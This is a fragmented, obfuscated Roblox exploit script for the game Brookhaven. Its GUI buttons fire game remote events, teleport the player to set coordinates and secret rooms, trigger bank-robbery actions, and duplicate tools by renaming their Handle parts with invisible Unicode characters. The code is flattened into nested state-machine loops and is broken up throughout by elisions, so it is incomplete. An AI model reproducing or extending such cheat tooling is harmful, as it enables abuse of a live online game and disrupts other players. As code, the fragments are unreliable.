														sound.Parent = player:WaitForChild("PlayerGui");
														sound:Play();
														FlatIdent_91ED6 = 1;
													end
											...
											if (FlatIdent_4E1AB == 2) then
												local FlatIdent_1776A = 0;
												while true do
													if (FlatIdent_1776A == 1) then
														FlatIdent_4E1AB = 3;
														break;
													end
													if (FlatIdent_1776A == 0) then
														sound.Volume = volume;
														sound.Looped = false;
														FlatIdent_1776A = 1;
													end
											...
											if (FlatIdent_4E1AB == 0) then
												local FlatIdent_7E663 = 0;
												while true do
													if (FlatIdent_7E663 == 1) then
														FlatIdent_4E1AB = 1;
														break;
													end
													if (FlatIdent_7E663 == 0) then
														soundId = 6349641063;
														volume = 0.1;
														FlatIdent_7E663 = 1;
													end
								...
								if (FlatIdent_48817 == 0) then
									local FlatIdent_7185 = 0;
									while true do
										if (FlatIdent_7185 == 0) then
											player = game.Players.LocalPlayer;
											character = player.Character or player.CharacterAdded:Wait() ;
											FlatIdent_7185 = 1;
										end
										if (FlatIdent_7185 == 1) then
											FlatIdent_48817 = 1;
											break;
										end
									end
				...
				Tab:AddButton({
					["Name"] = "Nissan Skyline R34 Engine",
					["Callback"] = function()
				...
				Tab:AddButton({
					["Name"] = "Toyota 3.5L V6 (K&N Air Intake)",
					["Callback"] = function()
						local FlatIdent_22ADB = 0;
						local FlatIdent_670D2;
						local args;
						while true do
							if (FlatIdent_22ADB == 1) then
								while true do
				...
				Tab:AddButton({
					["Name"] = "Nissan R GT-R engine Rev",
					["Callback"] = function()
						local FlatIdent_52F7E = 0;
						local FlatIdent_80E57;
						local args;
						while true do
				...
				Tab:AddButton({
					["Name"] = "NISSAN SKYLINE RB26",
					["Callback"] = function()
						local FlatIdent_73F5D = 0;
						local FlatIdent_8E1B8;
						local args;
						while true do
							if (1 == FlatIdent_73F5D) then
								while true do
				...
				Tab:AddButton({
					["Name"] = "TOYOTA GT-APEX STARTUP",
					["Callback"] = function()
						local FlatIdent_342AE = 0;
						local FlatIdent_452A3;
						local args;
						while true do
							if (FlatIdent_342AE == 0) then
								FlatIdent_452A3 = 0;
								args = nil;
								FlatIdent_342AE = 1;
							end
							if (1 == FlatIdent_342AE) then
								while true do
				...
				Tab:AddButton({
					["Name"] = "GT500 STARTUP",
					["Callback"] = function()
						local FlatIdent_846C2 = 0;
						local FlatIdent_517B6;
						local args;
						while true do
							if (FlatIdent_846C2 == 0) then
								FlatIdent_517B6 = 0;
								args = nil;
								FlatIdent_846C2 = 1;
							end
							if (FlatIdent_846C2 == 1) then
								while true do
				...
				Tab:AddButton({
					["Name"] = "FORD GT V8 REV",
					["Callback"] = function()
						local FlatIdent_74EC1 = 0;
						local FlatIdent_52769;
						local args;
						while true do
							if (FlatIdent_74EC1 == 0) then
								FlatIdent_52769 = 0;
								args = nil;
								FlatIdent_74EC1 = 1;
							end
							if (FlatIdent_74EC1 == 1) then
								while true do
									if (FlatIdent_52769 == 0) then
										args = {
											[1] = "PickingCarMusicText",
				...
				Tab:AddButton({
					["Name"] = "2017 NISSAN GT-R STARTUP",
					["Callback"] = function()
						local FlatIdent_30D1F = 0;
						local FlatIdent_7C0C7;
						local args;
						while true do
							if (FlatIdent_30D1F == 1) then
								while true do
									if (FlatIdent_7C0C7 == 0) then
										args = {
											[1] = "PickingCarMusicText",
											[2] = "897997800"
										};
				...
				Tab:AddButton({
					["Name"] = "7SAKU7 - WALTER 3",
					["Callback"] = function()
						local FlatIdent_55BA2 = 0;
						local args;
						while true do
							if (FlatIdent_55BA2 == 0) then
								args = {
									[1] = "PickingCarMusicText",
									[2] = "15689447525"
								};
				...
				Tab:AddButton({
					["Name"] = "7SAKU7 - SZRON",
					["Callback"] = function()
						local FlatIdent_77171 = 0;
						local args;
						while true do
							if (FlatIdent_77171 == 0) then
								args = {
									[1] = "PickingCarMusicText",
									[2] = "18841887159"
								};
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_4AB1F;
						local args;
						while true do
							if (FlatIdent_1E5D6 == 1) then
								while true do
				...
				Tab:AddButton({
					["Name"] = "Bagieta - Biszkopty",
					["Callback"] = function()
						local FlatIdent_B2DA = 0;
						local args;
						while true do
							if (FlatIdent_B2DA == 0) then
								args = {
									[1] = "PickingCarMusicText",
									[2] = "11265173310"
								};
				...
				Tab:AddButton({
					["Name"] = "Bagieta - Pierniki",
					["Callback"] = function()
						local FlatIdent_4636C = 0;
						local FlatIdent_88A52;
						local args;
						while true do
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_2449F;
						local args;
						while true do
							if (0 == FlatIdent_282AF) then
								FlatIdent_2449F = 0;
								args = nil;
								FlatIdent_282AF = 1;
							end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_27FC1;
						local args;
						while true do
							if (FlatIdent_418C6 == 1) then
								while true do
									if (0 == FlatIdent_27FC1) then
										args = {
											[1] = "PickingTools",
											[2] = "DuffleBagDiamonds"
										};
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						if (I == "1") then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(259.793549, 4.31312656, 222.495316, 0.0697301254, 5.7474157e-8, -0.997565866, -1.2071995e-8, 1, 5.677056e-8, 0.997565866, 8.083992e-9, 0.0697301254);
						end
						if (I == "2") then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(221.855865, 4.31312656, 227.744034, -0.999558985, -6.444556e-8, -0.0296953954, -6.294508e-8, 1, -5.146375e-8, 0.0296953954, -4.9571877e-8, -0.999558985);
						end
						if (I == "3") then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(259.64502, 21.313118, 222.366791, 0.0295533799, 4.4940325e-8, -0.999563217, 6.5617094e-9, 1, 4.5153968e-8, 0.999563217, -7.893296e-9, 0.0295533799);
						end
						if (I == "4") then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(221.814148, 21.313118, 227.371201, -0.999832332, 2.7962686e-8, -0.0183123704, 2.9712318e-8, 1, -9.52716e-8, 0.0183123704, -9.579973e-8, -0.999832332);
						end
						if (I == "5") then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(158.389679, 21.313118, 226.628189, -0.99999994, 4.693713e-8, 0.000375443458, 4.6923038e-8, 1, -3.754675e-8, -0.000375443458, -3.7529134e-8, -0.99999994);
						end
						if (I == "6") then
				...
				function teleportToPortalAgency()
				...
				function teleportToHospital()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new( -309, 4, 71);
				end
				Tab:AddButton({
					["Name"] = "Hospital",
					["Description"] = "Teleport to the coordinates of the Hospital",
					["Callback"] = function()
						teleportToHospital();
					end
				});
				function teleportToArch()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new( -589, 141, -59);
				end
				Tab:AddButton({
					["Name"] = "Arcada",
					["Description"] = "Teleport to the coordinates of the Arc",
					["Callback"] = function()
						teleportToArch();
					end
				});
				function teleportToOnTopOfSchool()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new( -370, 50, 173);
				end
				Tab:AddButton({
					["Name"] = "Above the School",
					["Description"] = "Teleports to the coordinates Above the School",
					["Callback"] = function()
						teleportToOnTopOfSchool();
					end
				});
				Tab:AddButton({
					["Name"] = "Teleport to above the hotel",
					["Callback"] = function()
				...
				Tab:AddButton({
					["Name"] = "Stay on top of the shopping mall",
					["Callback"] = function()
				...
				function teleportToMountain1()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new( -670, 251, 765);
				end
				Tab:AddButton({
					["Name"] = "Montain",
					["Description"] = "Teleports to the coordinates of Mountain",
					["Callback"] = function()
						teleportToMountain1();
					end
				});
				Section = Tab:AddSection({
					["Name"] = "Bank Brookhaven"
				});
				Tab:AddButton({
					["Name"] = "Bank Job",
					["Callback"] = function()
						...
						while true do
							if (FlatIdent_2A5AF == 0) then
								...
								game:GetService("ReplicatedStorage").RE:FindFirstChild("1Jo1b"):FireServer(unpack(args));
								break;
							end
						end
					end
				...
				Tab:AddButton({
					["Name"] = "Rob bank",
					["Callback"] = function()
						local FlatIdent_3062E = 0;
						local FlatIdent_3CC85;
						local plr;
						local char;
						local hrp;
						local args;
						while true do
							if (FlatIdent_3062E == 0) then
								FlatIdent_3CC85 = 0;
								plr = nil;
								FlatIdent_3062E = 1;
							end
							if (FlatIdent_3062E == 2) then
								args = nil;
								while true do
				...
				Tab:AddButton({
					["Name"] = "Secret 3 (police station )",
					["Callback"] = function()
						local FlatIdent_6310F = 0;
						local FlatIdent_20415;
						local plr;
						local char;
						local hrp;
						while true do
							if (FlatIdent_6310F == 2) then
								while true do
									...
									if (FlatIdent_20415 == 0) then
										local FlatIdent_8115D = 0;
										while true do
											if (FlatIdent_8115D == 0) then
												plr = game.Players.LocalPlayer;
												char = plr.Character;
												FlatIdent_8115D = 1;
											end
											if (FlatIdent_8115D == 1) then
												FlatIdent_20415 = 1;
												break;
											end
										end
				...
				function teleportToSecretRoomInWorkshop()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 4, -495);
				end
				Tab:AddButton({
					["Name"] = "Secret",
					["Description"] = "Teleports to the coordinates of the Secret Room Workshop",
					["Callback"] = function()
						teleportToSecretRoomInWorkshop();
					end
				});
				function teleportToSecretRoom2()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new( -343, 4, -613);
				end
				Tab:AddButton({
					["Name"] = "Secret 2",
					["Description"] = "Teleports to the coordinates of Secret Room 2",
					["Callback"] = function()
				...
				Tab:AddButton({
					["Name"] = "BillBoard 1",
					["Callback"] = function()
						local FlatIdent_3C2B7 = 0;
						local plr;
						local char;
						local hrp;
						while true do
							if (FlatIdent_3C2B7 == 0) then
								plr = game.Players.LocalPlayer;
								char = plr.Character;
								FlatIdent_3C2B7 = 1;
							end
							if (FlatIdent_3C2B7 == 1) then
								hrp = char.HumanoidRootPart;
				...
				Tab:AddButton({
					["Name"] = "BillBoard 2",
					["Callback"] = function()
						local FlatIdent_4946 = 0;
						local plr;
						local char;
						local hrp;
						while true do
							if (FlatIdent_4946 == 1) then
								hrp = char.HumanoidRootPart;
								hrp.CFrame = CFrame.new( -630.480712890625, 26.586822509765625, 365.14093017578125);
								break;
							end
							if (FlatIdent_4946 == 0) then
								local FlatIdent_963CA = 0;
								while true do
									if (FlatIdent_963CA == 0) then
										plr = game.Players.LocalPlayer;
										char = plr.Character;
										FlatIdent_963CA = 1;
									end
									if (FlatIdent_963CA == 1) then
										FlatIdent_4946 = 1;
										break;
									end
								end
				...
				Tab:AddButton({
					["Name"] = "Duplicate Fishing Rod (You Need This)",
					["Callback"] = function()
						args = {
							[1] = "ClearAllTools"
						};
						...
						oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
						if (game.Players.LocalPlayer.Character.Humanoid.Sit == true) then
							local FlatIdent_166D2 = 0;
							while true do
								if (FlatIdent_166D2 == 0) then
									task.wait();
									game.Players.LocalPlayer.Character.Humanoid.Sit = false;
									break;
								end
						...
						for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
							if toollll:IsA("Tool") then
								if (toollll.Name == toolselcted) then
									local FlatIdent_88463 = 0;
									while true do
										if (FlatIdent_88463 == 0) then
											toollllfoun = true;
											for nana, jjsjsj in pairs(toollll:GetDescendants()) do
												if (jjsjsj.Name == "Handle") then
													local FlatIdent_48421 = 0;
													local FlatIdent_14F1A;
													while true do
														if (FlatIdent_48421 == 0) then
															FlatIdent_14F1A = 0;
															while true do
						...
						if (toollllfoun == true) then
							local FlatIdent_325A1 = 0;
							local FlatIdent_465C1;
							while true do
								if (FlatIdent_325A1 == 0) then
									FlatIdent_465C1 = 0;
									while true do
										...
										if (FlatIdent_465C1 == 0) then
											local FlatIdent_24958 = 0;
											while true do
												if (FlatIdent_24958 == 0) then
													if (game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil) then
														toollllfoun = false;
													end
													repeat
						...
						for m = 1, dupeamot do
							if (duping == false) then
								...
								local FlatIdent_2A56F;
								while true do
									if (FlatIdent_8EC6E == 0) then
										FlatIdent_2A56F = 0;
										while true do
											if (FlatIdent_2A56F == 0) then
							...
							game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
							if (duping == false) then
								local FlatIdent_4FB68 = 0;
								while true do
									if (FlatIdent_4FB68 == 0) then
										local FlatIdent_8051E = 0;
										while true do
											if (FlatIdent_8051E == 0) then
												game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
												return;
											end
										end
				...
				Tab:AddButton({
					["Name"] = "make an aura out of a fishing rod",
					["Callback"] = function()
						local FlatIdent_75B0 = 0;
						local FlatIdent_3DAC6;
						local args;
						while true do
							if (0 == FlatIdent_75B0) then
								FlatIdent_3DAC6 = 0;
							...
							if (FlatIdent_75B0 == 1) then
								while true do
									...
									if (FlatIdent_3DAC6 == 0) then
										local FlatIdent_AB47 = 0;
										while true do
											if (FlatIdent_AB47 == 1) then
												wait(0);
												FlatIdent_3DAC6 = 1;
												break;
											end
											if (0 == FlatIdent_AB47) then
												args = {
													[1] = "RolePlayBio",
													[2] = "Please Wait..."
												};
									...
									if (FlatIdent_3DAC6 == 1) then
										...
										while true do
											if (FlatIdent_99831 == 1) then
												function equipAllTools()
													local FlatIdent_41EC1 = 0;
													while true do
														if (FlatIdent_41EC1 == 1) then
															for _, tool in pairs(backpack:GetChildren()) do
																if tool:IsA("Tool") then
																	tool.Parent = character;
																end
														...
														if (FlatIdent_41EC1 == 0) then
															local FlatIdent_6C6FC = 0;
															while true do
																if (FlatIdent_6C6FC == 0) then
																	backpack = LocalPlayer.Backpack;
																	character = LocalPlayer.Character;
																	FlatIdent_6C6FC = 1;
																end
																if (1 == FlatIdent_6C6FC) then
																	FlatIdent_41EC1 = 1;
																	break;
																end
															end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
						if (game.Players.LocalPlayer.Character.Humanoid.Sit == true) then
							local FlatIdent_176E = 0;
							local FlatIdent_1B19A;
							while true do
								if (FlatIdent_176E == 0) then
									FlatIdent_1B19A = 0;
									while true do
								...
								if (toollel.Name == toolselcted) then
									...
									while true do
										if (FlatIdent_648BB == 0) then
											...
											for basc, aijfw in pairs(toollel:GetDescendants()) do
												if (aijfw.Name == "Handle") then
													local FlatIdent_8922D = 0;
													local FlatIdent_94041;
													while true do
														if (FlatIdent_8922D == 0) then
															FlatIdent_94041 = 0;
															while true do
																...
																if (1 == FlatIdent_94041) then
																	...
																	while true do
																		if (FlatIdent_11649 == 1) then
																			FlatIdent_94041 = 2;
																			break;
																		end
																		if (0 == FlatIdent_11649) then
																			toollel.Parent = game.Players.LocalPlayer.Character;
																			tollllahhhh = toollel;
																			FlatIdent_11649 = 1;
																		end
															...
															while true do
																...
																if (FlatIdent_8BAB6 == 0) then
																	...
																	while true do
																		...
																		if (FlatIdent_2299 == 1) then
																			FlatIdent_8BAB6 = 1;
																			break;
																		end
																	end
																end
																if (FlatIdent_8BAB6 == 2) then
																	toollll.Parent = game.Players.LocalPlayer.Character;
																	toolllffel = toollll;
																	break;
																end
						...
						if (toollllfoun2 == true) then
							local FlatIdent_6E82F = 0;
							while true do
								if (0 == FlatIdent_6E82F) then
									if (game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil) then
										toollllfoun2 = false;
									end
									repeat
						...
						for m = 1, dupeamot do
							...
							while true do
								...
								if (FlatIdent_8ECFB == 1) then
									while true do
										if (FlatIdent_3A13E == 1) then
											local FlatIdent_8E68F = 0;
											while true do
												if (0 == FlatIdent_8E68F) then
													args = {
														[1] = "PickingTools",
														[2] = toolselcted
													};
										...
										if (FlatIdent_3A13E == 3) then
											game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack;
											game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
											repeat
												local FlatIdent_5C7CA = 0;
												local FlatIdent_7EA98;
												while true do
						...
						local backpack = player.Backpack;
						for _, tool in pairs(backpack:GetChildren()) do
							if (tool:IsA("Tool") and (tool.Name == "Sign")) then
								table.insert(tools, tool);
							end
						end
						if ( #tools == 0) then
							local FlatIdent_5CBA8 = 0;
							local FlatIdent_75368;
							while true do
								if (FlatIdent_5CBA8 == 0) then
									FlatIdent_75368 = 0;
									while true do
										if (0 == FlatIdent_75368) then
											print("No 'Sign' tools in the backpack.");
											return;
										end
									end
									break;
						...
						for index = 1, math.min(6, #tools) do
							local tool = tools[index];
							local letter = letters[(index % #letters) + 1 ];
							...
							print("Equipped tool: "   .. tool.Name );
							local gripPosIndex = math.min(index, #TablaGripPos);
							...
							if tool:IsDescendantOf(player.Character) then
								...
								while true do
									if (FlatIdent_18255 == 0) then
										tool.GripPos = gripPos;
										print("Założono narzędzie:", tool.Name, "z GripPos:", gripPos);
										break;
									end
								end
							else
								warn("Nie udało się ustawić chwytu dla:", tool.Name);
							end
							local args = {
								[1] = "Sign",
								[2] = "SignWords",
							...
							if (player.Character:FindFirstChild("Sign") and player.Character.Sign:FindFirstChild("ToolSound")) then
								local FlatIdent_CD65 = 0;
								while true do
									if (0 == FlatIdent_CD65) then
										player.Character.Sign.ToolSound:FireServer(unpack(args));
										print("Fired FireServer with letter: "   .. letter );
										break;
									end
								end
							else
								print("No Sign or ToolSound in the player character.");
							end
							wait(0);
						end
						...
						function equipAllTools()
							...
							while true do
								if (FlatIdent_8C19D == 0) then
									local FlatIdent_57C72 = 0;
									while true do
										if (FlatIdent_57C72 == 1) then
											FlatIdent_8C19D = 1;
											break;
										end
										if (FlatIdent_57C72 == 0) then
											backpack = LocalPlayer.Backpack;
											character = LocalPlayer.Character;
											FlatIdent_57C72 = 1;
										end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
						if (game.Players.LocalPlayer.Character.Humanoid.Sit == true) then
							local FlatIdent_5217F = 0;
							while true do
								if (FlatIdent_5217F == 0) then
									task.wait();
									game.Players.LocalPlayer.Character.Humanoid.Sit = false;
									break;
								end
						...
						for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
							if toollll:IsA("Tool") then
								if (toollll.Name == toolselcted) then
									local FlatIdent_3C185 = 0;
									while true do
										if (FlatIdent_3C185 == 0) then
											toollllfoun = true;
											for nana, jjsjsj in pairs(toollll:GetDescendants()) do
												if (jjsjsj.Name == "Handle") then
													...
													while true do
														if (0 == FlatIdent_54A2D) then
															FlatIdent_589FE = 0;
															while true do
																if (1 == FlatIdent_589FE) then
																	local FlatIdent_9A7B = 0;
																	while true do
																		if (FlatIdent_9A7B == 0) then
																			jjsjsj.Name = "H⁥a⁥n⁥d⁥l⁥e";
																			toollll.Parent = game.Players.LocalPlayer.Backpack;
																			FlatIdent_9A7B = 1;
																		end
																		if (FlatIdent_9A7B == 1) then
																			FlatIdent_589FE = 2;
																			break;
																		end
																	end
																end
																if (2 == FlatIdent_589FE) then
																	toollll.Parent = game.Players.LocalPlayer.Character;
																	toolllffel = toollll;
																	break;
																end
						...
						for m = 1, dupeamot do
							...
							local FlatIdent_47707;
							local args;
							while true do
								if (FlatIdent_92646 == 1) then
									while true do
										if (FlatIdent_47707 == 2) then
											local FlatIdent_4DE63 = 0;
											while true do
												if (FlatIdent_4DE63 == 0) then
													if (duping == false) then
						...
						if ( #tools == 0) then
							...
							while true do
								if (FlatIdent_7D6F7 == 0) then
									local FlatIdent_4B99C = 0;
									while true do
										if (FlatIdent_4B99C == 0) then
											print("No 'Sign' tools in the backpack.");
											return;
										end
									end
						...
						for index = 1, math.min(7, #tools) do
							local tool = tools[index];
							local letter = letters[(index % #letters) + 1 ];
							for _, equippedTool in pairs(player.Character:GetChildren()) do
								if equippedTool:IsA("Tool") then
							...
							if tool:IsDescendantOf(player.Character) then
								...
								local FlatIdent_71CEA;
								while true do
									if (FlatIdent_69F0 == 0) then
										FlatIdent_71CEA = 0;
										while true do
											if (FlatIdent_71CEA == 0) then
												tool.GripPos = gripPos;
												print("Założono narzędzie:", tool.Name, "z GripPos:", gripPos);
												break;
											end
							...
							if (player.Character:FindFirstChild("Sign") and player.Character.Sign:FindFirstChild("ToolSound")) then
								local FlatIdent_211E = 0;
								local FlatIdent_CFBE;
								while true do
									if (FlatIdent_211E == 0) then
										FlatIdent_CFBE = 0;
										while true do
											if (0 == FlatIdent_CFBE) then
												player.Character.Sign.ToolSound:FireServer(unpack(args));
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
							if toollel:IsA("Tool") then
								if (toollel.Name == toolselcted) then
									local FlatIdent_487A8 = 0;
									while true do
										if (0 == FlatIdent_487A8) then
											toollllfoun2 = true;
											for basc, aijfw in pairs(toollel:GetDescendants()) do
												if (aijfw.Name == "Handle") then
													local FlatIdent_6E880 = 0;
													local FlatIdent_860F1;
													while true do
														if (FlatIdent_6E880 == 0) then
															FlatIdent_860F1 = 0;
															while true do
																if (1 == FlatIdent_860F1) then
																	toollel.Parent = game.Players.LocalPlayer.Character;
																	tollllahhhh = toollel;
																	FlatIdent_860F1 = 2;
																end
																if (0 == FlatIdent_860F1) then
						...
						for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
							if toollll:IsA("Tool") then
								if (toollll.Name == toolselcted) then
									local FlatIdent_353EF = 0;
									local FlatIdent_4732D;
									while true do
										if (FlatIdent_353EF == 0) then
											FlatIdent_4732D = 0;
											while true do
												if (FlatIdent_4732D == 0) then
													toollllfoun = true;
													for nana, jjsjsj in pairs(toollll:GetDescendants()) do
														if (jjsjsj.Name == "Handle") then
															local FlatIdent_54660 = 0;
															local FlatIdent_57DB3;
															while true do
																if (FlatIdent_54660 == 0) then
																	FlatIdent_57DB3 = 0;
																	while true do
																		...
																		if (0 == FlatIdent_57DB3) then
																			...
																			while true do
																				if (FlatIdent_7393F == 1) then
																					FlatIdent_57DB3 = 1;
																					break;
																				end
																				if (FlatIdent_7393F == 0) then
																					toollll.Parent = game.Players.LocalPlayer.Character;
																					wait();
																					FlatIdent_7393F = 1;
																				end
						...
						if (toollllfoun == true) then
							local FlatIdent_8B332 = 0;
							local FlatIdent_95AA1;
							while true do
								if (FlatIdent_8B332 == 0) then
									FlatIdent_95AA1 = 0;
									while true do
										if (1 == FlatIdent_95AA1) then
											toollllfoun = false;
											break;
										end
										if (0 == FlatIdent_95AA1) then
											if (game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil) then
												toollllfoun = false;
											end
											repeat
						...
						wait(2);
						for m = 1, dupeamot do
							local FlatIdent_7D93C = 0;
							local args;
							while true do
								if (FlatIdent_7D93C == 0) then
									if (duping == false) then
										local FlatIdent_40DA9 = 0;
										local FlatIdent_8B099;
										while true do
											if (FlatIdent_40DA9 == 0) then
												FlatIdent_8B099 = 0;
												while true do
													if (0 == FlatIdent_8B099) then
														local FlatIdent_54AE6 = 0;
														while true do
															if (FlatIdent_54AE6 == 0) then
																game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
								...
								if (2 == FlatIdent_7D93C) then
									game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "H⁥a⁥n⁥d⁥l⁥e";
									game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack;
									game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
									repeat
										local FlatIdent_CEA0 = 0;
										while true do
											if (0 == FlatIdent_CEA0) then
												if game:GetService("Workspace"):FindFirstChild("Camera") then
													game:GetService("Workspace"):FindFirstChild("Camera"):Destroy();
												end
												task.wait();
						...
						for index = 1, math.min(4, #tools) do
							local tool = tools[index];
							local letter = letters[(index % #letters) + 1 ];
							for _, equippedTool in pairs(player.Character:GetChildren()) do
								if equippedTool:IsA("Tool") then
							...
							while true do
								if (FlatIdent_2BBB3 == 0) then
									...
									while true do
										...
										if (FlatIdent_453D == 1) then
											FlatIdent_2BBB3 = 1;
											break;
										end
									end
								end
								if (FlatIdent_2BBB3 == 1) then
									for _, tool in pairs(backpack:GetChildren()) do
										if tool:IsA("Tool") then
											tool.Parent = character;
										end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						for m = 1, 2 do
							local FlatIdent_59FBF = 0;
							while true do
								if (FlatIdent_59FBF == 0) then
									task.wait();
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -480, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922);
									break;
								end
						...
						for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
							if toollel:IsA("Tool") then
								if (toollel.Name == toolselcted) then
									local FlatIdent_5F2BA = 0;
									local FlatIdent_30F7E;
									while true do
										if (FlatIdent_5F2BA == 0) then
											FlatIdent_30F7E = 0;
											while true do
														...
														if (aijfw.Name == "Handle") then
															...
															while true do
																...
																if (FlatIdent_24177 == 0) then
																	local FlatIdent_27EC1 = 0;
																	while true do
																		if (1 == FlatIdent_27EC1) then
																			FlatIdent_24177 = 1;
																			break;
																		end
																		if (0 == FlatIdent_27EC1) then
																			aijfw.Name = "H⁥a⁥n⁥d⁥l⁥e";
																			toollel.Parent = game.Players.LocalPlayer.Backpack;
																			FlatIdent_27EC1 = 1;
																		end
								...
								if (toollll.Name == toolselcted) then
									...
									while true do
										if (FlatIdent_3B073 == 0) then
											...
											for nana, jjsjsj in pairs(toollll:GetDescendants()) do
												if (jjsjsj.Name == "Handle") then
													local FlatIdent_1B719 = 0;
													local FlatIdent_95783;
													while true do
														if (0 == FlatIdent_1B719) then
															FlatIdent_95783 = 0;
															while true do
																if (FlatIdent_95783 == 1) then
																	jjsjsj.Name = "H⁥a⁥n⁥d⁥l⁥e";
																	toollll.Parent = game.Players.LocalPlayer.Backpack;
																	FlatIdent_95783 = 2;
																end
																if (FlatIdent_95783 == 0) then
																	toollll.Parent = game.Players.LocalPlayer.Character;
																	wait();
																	FlatIdent_95783 = 1;
																end
																if (2 == FlatIdent_95783) then
																	toollll.Parent = game.Players.LocalPlayer.Character;
																	toolllffel = toollll;
																	break;
																end
						...
						wait(2);
						for m = 1, dupeamot do
							local FlatIdent_3BE53 = 0;
							local args;
							while true do
								if (FlatIdent_3BE53 == 3) then
									game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack;
									game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
									repeat
										local FlatIdent_25D61 = 0;
										local FlatIdent_6440A;
										while true do
											if (FlatIdent_25D61 == 0) then
												FlatIdent_6440A = 0;
												while true do
								...
								if (FlatIdent_3BE53 == 0) then
									if (duping == false) then
										local FlatIdent_3E335 = 0;
										local FlatIdent_6D46D;
										while true do
											if (FlatIdent_3E335 == 0) then
												FlatIdent_6D46D = 0;
												while true do
								...
								if (FlatIdent_3BE53 == 2) then
									if (duping == false) then
										local FlatIdent_6C65 = 0;
										while true do
											if (FlatIdent_6C65 == 0) then
												game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false;
												return;
											end
										end
						...
						if ( #tools == 0) then
							local FlatIdent_269C3 = 0;
							while true do
								if (0 == FlatIdent_269C3) then
									print(".");
									return;
								end
							end
						end
						for index = 1, math.min(5, #tools) do
							local tool = tools[index];
							local letter = letters[(index % #letters) + 1 ];
							for _, equippedTool in pairs(player.Character:GetChildren()) do
								if equippedTool:IsA("Tool") then
							...
							local gripPos = TablaGripPos[gripPosIndex];
							if tool:IsDescendantOf(player.Character) then
								local FlatIdent_1E43F = 0;
								while true do
									if (FlatIdent_1E43F == 0) then
										tool.GripPos = gripPos;
										print("Założono narzędzie:", tool.Name, "z GripPos:", gripPos);
										break;
									end
							...
							if (player.Character:FindFirstChild("Sign") and player.Character.Sign:FindFirstChild("ToolSound")) then
								local FlatIdent_307AF = 0;
								while true do
									if (FlatIdent_307AF == 0) then
										player.Character.Sign.ToolSound:FireServer(unpack(args));
										print("Fired FireServer with letter: "   .. letter );
										break;
									end
								...
								if (FlatIdent_30047 == 0) then
									...
									while true do
										...
										if (0 == FlatIdent_78AE8) then
											...
											while true do
												if (FlatIdent_5CAFD == 1) then
													FlatIdent_78AE8 = 1;
													break;
												end
												if (FlatIdent_5CAFD == 0) then
													backpack = LocalPlayer.Backpack;
													character = LocalPlayer.Character;
													FlatIdent_5CAFD = 1;
												end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
							if toollel:IsA("Tool") then
								if (toollel.Name == toolselcted) then
									local FlatIdent_66C5D = 0;
									while true do
										if (FlatIdent_66C5D == 0) then
											toollllfoun2 = true;
											for basc, aijfw in pairs(toollel:GetDescendants()) do
												if (aijfw.Name == "Handle") then
													local FlatIdent_4E2EA = 0;
													local FlatIdent_BA44;
													while true do
														if (FlatIdent_4E2EA == 0) then
															FlatIdent_BA44 = 0;
															while true do
																if (FlatIdent_BA44 == 0) then
																	local FlatIdent_36708 = 0;
																	while true do
																		if (FlatIdent_36708 == 0) then
																			aijfw.Name = "H⁥a⁥n⁥d⁥l⁥e";
